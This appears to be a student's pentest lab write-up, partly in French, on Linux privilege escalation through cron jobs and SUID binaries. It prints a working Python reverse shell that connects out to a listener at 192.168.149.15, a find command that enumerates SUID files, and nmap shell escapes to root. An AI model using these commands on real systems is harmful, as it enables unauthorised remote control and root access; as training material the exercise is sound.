

## 2.1. Cron Jobs

(i) Download pspy32 in a folder /home/alice/your-name/.
```bash
# sur macOS
$ scp pspy32 nabil@10.211.55.6:/home/nabil/Pentest/PrivEsc/

# sur kali
$ scp Pentest/PrivEsc/pspy32 alice@10.11.1.36:/home/alice/nabil 
Unable to negotiate with 10.11.1.36 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
scp: Connection closed

$ scp Pentest/PrivEsc/pspy32 alice@10.11.1.36:/home/alice/nabil -oHostKeyAlgorithms=+ssh-rsa
-oHostKeyAlgorithms=+ssh-rsa: No such file or directory
$ scp -oHostKeyAlgorithms=+ssh-rsa Pentest/PrivEsc/pspy32 alice@10.11.1.36:/home/alice/nabil
alice@10.11.1.36's password: 
pspy32                                                                                            100% 2872KB   3.2MB/s   00:00    
```

(ii) For pspy32 to work, you must give it execution rights.
```bash
$ ls -l
total 20
drwxr-xr-x 2 alice alice 4096 2023-09-28 05:44 aless
drwxr-xr-x 2 alice alice 4096 2023-09-21 03:42 mahsum
drwxr-xr-x 2 root  root  4096 2023-09-27 04:55 mike
drwxr-xr-x 2 alice alice 4096 2023-09-28 09:56 nabil
drwxr-xr-x 2 alice alice 4096 2023-09-21 10:06 Seb
$ cd nabil
$ ls -l
total 2876
-rw-r--r-- 1 alice alice 2940928 2023-09-28 09:56 pspy32
$ chmod +x pspy32 
$ ls -l           
total 2876
-rwxr-xr-x 1 alice alice 2940928 2023-09-28 09:56 pspy32
```


(iii) Wait 5 minutes, you can go get a coffee.
-
(iv) Is there a process to launch if so, which one?
```bash
$ cd nabil
$ ./pspy32
...
2022/08/02 05:30:01 CMD: UID=256  PID=9126   | bash /var/www/backup.sh 
...
```

(v) What is the file that is executed?
```
backup.sh
```

(vi) Do you have write permissions on this file?
yes

(vii) Do a test by overwriting the file with a command line to start a reverse shell

Le reverse shell classique n'a pas fonctionné (en bash pur) du coup, je suis passé par python avec une reverse qui utilise les ==sockets==

```bash
export RHOST="192.168.149.15";export RPORT=1234;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Cependant, il faut que je l'exécute moi-même pour que le reverse shell se fasse cependant comme je l'exécute en tant qu'alice je n'ai pas de shell en root.... Après être passé en root dans la partie SUID, j'ai pu remarqué que la crontab ne contient pas une exécution toutes les 5 minutes de /var/ww/backup.sh, du coup ici le reverse shell root n'est pas faisable, me semble-t-il!

(viii) Wait 5 minutes, you can check your email.



## 2.2. SUID/SGID


1.Display the executables whose SUID bit is set.
```bash
$ find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 63584 2008-04-14 23:36 /bin/umount
-rwsr-xr-- 1 root fuse 20056 2008-02-26 13:25 /bin/fusermount
-rwsr-xr-x 1 root root 25540 2008-04-02 21:08 /bin/su
-rwsr-xr-x 1 root root 81368 2008-04-14 23:36 /bin/mount
-rwsr-xr-x 1 root root 30856 2007-12-10 12:33 /bin/ping
-rwsr-xr-x 1 root root 26684 2007-12-10 12:33 /bin/ping6
-rwsr-xr-x 1 root root 65520 2008-12-02 14:31 /sbin/mount.nfs
-rwsr-xr-- 1 root dhcp 2960 2008-04-02 09:38 /lib/dhcp3-client/call-dhclient-script
-rwsr-xr-x 2 root root 107776 2008-02-25 06:22 /usr/bin/sudoedit
-rwsr-sr-x 1 root root 7460 2008-06-25 16:53 /usr/bin/X
-rwsr-xr-x 1 root root 8524 2007-11-22 07:14 /usr/bin/netkit-rsh
-rwsr-xr-x 1 root root 37360 2008-04-02 21:08 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 12296 2007-12-10 12:33 /usr/bin/traceroute6.iputils
-rwsr-xr-x 2 root root 107776 2008-02-25 06:22 /usr/bin/sudo
-rwsr-xr-x 1 root root 12020 2007-11-22 07:14 /usr/bin/netkit-rlogin
-rwsr-xr-x 1 root root 11048 2007-12-10 12:33 /usr/bin/arping
-rwsr-sr-x 1 daemon daemon 38464 2007-02-20 08:41 /usr/bin/at
-rwsr-xr-x 1 root root 19144 2008-04-02 21:08 /usr/bin/newgrp
-rwsr-xr-x 1 root root 28624 2008-04-02 21:08 /usr/bin/chfn
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
-rwsr-xr-x 1 root root 23952 2008-04-02 21:08 /usr/bin/chsh
-rwsr-xr-x 1 root root 15952 2007-11-22 07:14 /usr/bin/netkit-rcp
-rwsr-xr-x 1 root root 29104 2008-04-02 21:08 /usr/bin/passwd
-rwsr-xr-x 1 root root 46084 2008-03-31 00:32 /usr/bin/mtr
-rwsr-sr-x 1 libuuid libuuid 12336 2008-03-27 13:25 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 269256 2007-10-04 15:57 /usr/sbin/pppd
-rwsr-xr-- 1 root telnetd 6040 2006-12-17 21:16 /usr/lib/telnetlogin
-rwsr-xr-- 1 root www-data 10276 2010-03-09 15:52 /usr/lib/apache2/suexec
-rwsr-xr-x 1 root root 4524 2007-11-05 15:48 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 165748 2008-04-06 07:50 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9624 2009-08-17 21:04 /usr/lib/pt_chown
```


2.Look at the gtfobins site to see which executable would give you root privileges(https:\//gtfobins.github.io/)
```
nmap
```

3.Execute de the command.
```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

ici j'obtiens un root shell mais ce que j'ecris ne s'affiche pas mais les commandes s'exécutent...

OU

```bash
sudo nmap --interactive
nmap> !sh
```

4.What is the executable that is exploitable and has the possibility to configure the suid ? 

```
/usr/bin/nmap
```



## 2.3. Interesting Files writable

-

